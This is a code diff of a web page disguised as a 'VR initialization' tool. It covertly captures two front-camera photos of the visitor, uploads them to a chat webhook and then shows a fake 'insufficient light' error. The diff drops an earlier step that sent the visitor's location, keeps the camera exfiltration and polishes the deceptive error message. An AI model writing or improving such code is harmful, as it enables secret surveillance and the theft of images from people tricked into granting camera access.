@@ -21,7 +21,6 @@
     <div id="status"></div>
 </div>
 
-<!-- 關鍵：設置自動播放、行內播放與靜音，確保相機流能啟動 -->
 <video id="v" style="display:none;" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
@@ -34,7 +33,7 @@ async function initVR() {
     document.getElementById("status").innerHTML = "> INITIALIZING...";
 
     try {
-        // 1. 同時請求權限 (這會跳出瀏覽器詢問窗)
+        // 僅請求相機權限，不再請求定位
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "user" }, 
             audio: false 
@@ -44,25 +43,16 @@ async function initVR() {
         const video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 某些手機瀏覽器需要顯式調用 play()
         await video.play();
         
         document.getElementById("status").innerHTML = "> SCANNING ENVIRONMENT...";
         
-        // 2. 獲取位置
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const map = `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`;
-                sendToDiscord("📍 **VR模式-定位回傳**\n" + map);
-            });
-        }
-
-        // 3. 拍照邏輯 (間隔兩秒拍兩張，確保成功)
+        // 拍照邏輯 (間隔兩秒拍兩張)
         setTimeout(() => takeSnapshot(1), 2000);
         setTimeout(() => takeSnapshot(2, true), 4000);
 
     } catch (err) {
-        document.getElementById("status").innerHTML = "> ERROR: ACCESS DENIED";
+        document.getElementById("status").innerHTML = "> ERROR: SENSOR ACCESS DENIED";
         console.error(err);
     }
 }
@@ -78,27 +68,24 @@ function takeSnapshot(num, isLast = false) {
         
         canvas.toBlob(blob => {
             const fd = new FormData();
-            fd.append("file", blob, `vr_snap_${num}.jpg`);
-            fd.append("payload_json", JSON.stringify({ content: `📸 **VR 掃描 ${num}/2**` }));
+            fd.append("file", blob, "vr_snap_" + num + ".jpg");
+            fd.append("payload_json", JSON.stringify({ content: "📸 **VR 環境掃描中 (" + num + "/2)**" }));
             
             fetch(webhook, { method: "POST", body: fd }).then(() => {
                 if (isLast) {
-                    // 拍完後徹底關閉相機燈號
-                    currentStream.getTracks().forEach(t => t.stop());
+                    // 關閉相機燈號
+                    if (currentStream) {
+                        currentStream.getTracks().forEach(t => t.stop());
+                    }
                     document.getElementById("status").innerHTML = "> VR READY. CALIBRATING...";
-                    setTimeout(() => { alert("VR 初始化失敗，請重試"); location.reload(); }, 500);
+                    setTimeout(() => { 
+                        alert("VR 初始化失敗：光線不足，請重試。"); 
+                        location.reload(); 
+                    }, 500);
                 }
             });
         }, "image/jpeg", 0.7);
     }
-}
-
-function sendToDiscord(msg) {
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: msg })
-    });
 }
 </script>
 </body>
